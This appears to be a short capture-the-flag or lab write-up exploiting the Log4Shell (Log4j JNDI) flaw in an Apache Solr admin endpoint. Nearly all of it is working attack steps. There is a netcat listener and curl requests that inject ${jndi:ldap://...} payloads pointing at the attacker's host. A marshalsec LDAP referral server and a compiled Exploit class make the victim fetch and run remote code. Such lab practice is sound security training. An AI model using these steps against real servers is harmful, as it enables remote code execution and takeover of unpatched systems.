# Log4j 

> VOiD | Thursday 23 December 2021 05:50:16 AM UTC

My IP : 10.8.253.221
Target IP : 

```bash
nc -nlvp 4444

curl 'http://10.10.14.60:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.253.221:4444\}'

we get a connection back
```

```bash
We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

    ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
    LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
    The victim retrieves and executes the code present in http://attackerserver/resource

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

    python3 -m http.server
    php -S 0.0.0.0:8000
    (or any other busybox httpd or formal web service you might like)
```

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.253.221/#Exploit"


javac Exploit.java -source 8 -target 8
```


## Exploit
```bash
curl 'http://10.10.14.60:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.253.221:1389/Exploit\}'
```